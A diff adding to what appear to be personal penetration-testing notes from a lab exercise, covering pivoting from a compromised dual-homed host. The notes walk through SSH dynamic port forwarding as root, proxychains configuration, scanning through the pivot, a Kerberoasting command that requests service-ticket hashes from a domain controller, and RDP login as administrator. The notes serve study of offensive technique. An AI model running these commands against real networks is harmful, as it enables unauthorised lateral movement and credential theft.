@@ -19,3 +19,37 @@
     - `ssh -D 8000 user@target.thm -fN`
     - Can also use 1337 as a port. It will open up a port 1337 on localhost to act as a proxy and send data through into the protected network. This is used with proxychains.
       - Make sure proxychains config file set up correctly
+     
+## Overview
+- Access to target machine 1
+  - ip a
+  - potenitally identify another IP address (dual home)
+    - couldn't previously ping to it due to no route to it
+    - **Next Steps:**
+      - Pivot through IP with access to IP without access
+      - Use network we have access to (NIC1) to access (NIC2)
+        - Ideal method
+        -  set up a proxy and pivot through it 
+        - ssh into IP we have compromised
+          - `ssh -i pivot root@10.10.155.10
+          - `ip a` shows us another NIC with IP 10.10.10.5
+          - Cant access this network so need to pivot through 10.10.155.10 NIC1 to access 10.10.10.5 NIC2
+          - review proxychain file
+            - `cat /etc/proxychains4.conf
+            - find or update port were socks4 to
+              - socks4 127.0.0.1 9050
+                - 9050 is the port were going to bind to. can be updated as needed
+            - ssh into 10.10.155.10 via this port
+            - **`ssh -f -N -D 9050 -i pivot root@10.10.155.10`**
+              - This is the key connection needed for us to move forward with proxychains commands thorugh this NIC2. Connection will minimize and we can proxy our access
+            - utilize proxychains to to run nmap, kerberose, firefox, xfreerdp, etc
+            - *kerberoast* attack thorugh proxy chains is ideal
+            - scan domain ip to ensure kerbroast port 88 open (should be if its domain controller)
+              - `proxychains nmap -p88 10.10.10.225`
+              - `proxychains GetUserSPNs.py domain.local/username:Password -dc -ip 10.10.10.225 -request`
+                - should get some hashes back
+            - if rdp os open we can access the machine directly
+              - `proxychains xfreerdp /u:administrator /p:'Password' /v:10.10.10.225
+            - any webpages this NIC2 may have access to we can also access through proxychains
+            - `proxychains firefox`
+          - **in general run a ping sweep through proxychains to see what is open then can nmap those and use -sT if its not working since connect scan will sometimes work where SIN scan doesnt**
